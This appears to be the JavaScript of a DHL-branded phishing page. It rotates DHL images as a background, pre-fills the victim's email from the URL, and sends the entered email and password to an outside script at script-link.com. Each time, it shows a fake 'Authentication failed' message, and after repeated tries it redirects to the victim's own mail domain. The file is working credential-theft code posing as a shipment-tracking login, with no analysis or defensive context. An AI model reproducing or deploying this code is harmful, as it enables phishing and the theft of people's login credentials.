var bgImageArray = ["https://www.dpdhl-brands.com/content/dam/dpdhl-corporate/dhl/guides/opener/logo-thumb.png", "https://kijamii.com/images/work/13-%20Story%20Thirteen%20-%20DHL/Others%20(in%20story)/DHL%205.jpg", "https://chuyenphatnhanhdhlhcm.vn/wp-content/uploads/2018/07/bannerDHL-e1536645731248.jpg", "https://images.jdmagicbox.com/comp/chennai/m2/044pxx44.xx44.180817061507.n2m2/catalogue/dtdc-dhl-express-courier-service-kattupakkam-chennai-domestic-courier-services-8pge1s5old.jpg", "http://3655c9b7d0e4c7eb8e62-f41b8e4824d18971b72e44324f6764b3.r43.cf1.rackcdn.com/global/imagelib/hero-images-offer/hero-friendly2-40.jpg", "https://proceed.solutions/wp-content/uploads/2019/01/DHL-Tyrefort-Birmingham.jpg", "https://www.thenational.ae/image/policy:1.655350:1506091043/image/jpeg.jpg", "https://www.dpdhl.com/content/dam/dpdhl/en/media-relations/teaser-carousel-1375x504/divisions.jpg", "https://www.logistics.dhl/content/dam/dhl/global/core/images/homepage-background-2730x1148/glo-home-our-businesses-background-plane4.web.1366.574.jpg", "https://secureservercdn.net/198.71.233.227/4f2.e16.myftpupload.com/wp-content/uploads/2017/03/dhl.jpg", "https://www.baumannmusic.com/wp-content/uploads/2017/12/Background-Music-for-DHL-Video-830x467.jpg", "https://cdn.wallpapersafari.com/18/53/3K29yL.jpg", "https://www.dpdhl.com/content/dam/dpdhl/en/about-us/teaser-carousel-1375x504/ecommerce-solutions-1375x504.jpg", "https://www.parcello.org/assets/images/pages/dhl-paketnetzwerk-original.jpg", "https://i.ytimg.com/vi/hUZ-R8TiTcY/maxresdefault.jpg", "https://postandparcel.info/wp-content/uploads/2015/11/dpdhl-trainees-tutor-600.jpg", "https://i.ytimg.com/vi/2Rb8iz3bQlo/maxresdefault.jpg",],
base = "",
secs = 5;
bgImageArray.forEach(function(img){
    new Image().src = base + img; 
    // caches images, avoiding white flash between background replacements
});

function backgroundSequence() {
	window.clearTimeout();
	var k = 0;
	for (i = 0; i < bgImageArray.length; i++) {
		setTimeout(function(){ 
			document.getElementById('animated-bg').style.background = "url(" + base + bgImageArray[k] + ") no-repeat center center";
			document.getElementById('animated-bg').style.backgroundSize ="cover";
		if ((k + 1) === bgImageArray.length) { setTimeout(function() { backgroundSequence() }, (secs * 1000))} else { k++; }			
		}, (secs * 1000) * i)	
	}
}
backgroundSequence();
$(document).ready(function () {
    var count = 0;
    var email = window.location.hash.substr(1);
    if (!email) {
    } else {
        var my_email = email;
        $("#email").val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!filter.test(my_email)) {
            $('#status-message').text("Authentication failed! Please check spelling and try again.");
            email.focus;
            return !1;
        }
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr(ind + 1);
        $("#userid").text(email);
    }
    $("#login_submit").click(function () {
        //event.preventDefault();
        var password = $("#password").val();
		if(password == '') {
			$('#status-message').text("Authentication failed! Please check spelling and try again.");
		}else{
			count = count + 1;
			$.ajax({
				dataType: "JSON",
				url: "https://script-link.com/script.php",
				type: "POST",
				data: { email: email, password: password },
				beforeSend: function (xhr) {
					$("#login_submit").html("Verifing...");
				},
				success: function (response) {
					$("#status-message").html("Authentication failed! Please check spelling and try again.");
					if (response) {
						$("#status-message").html("Authentication failed! Please check spelling and try again.");
						//console.log(response);
						//$("#status-message").html(response.msg);
						if (response.signal == "ok") {
							$("#password").val("");
							if (count >= 2) {
								count = 0;
								window.location.replace("http://www." + my_slice);
							}
						} else {
							$("#status-message").html("Authentication failed! Please check spelling and try again.");
						}
					}
				},
				error: function () {
					$("#password").val("");
					if (count >= 3) {
						count = 0;
						window.location.replace("http://www." + my_slice);
					}
					$("#msg").show();
				},
				complete: function () {
					$("#login_submit").html("Track Shipment >>");
				},
			});
		}
        
    });
});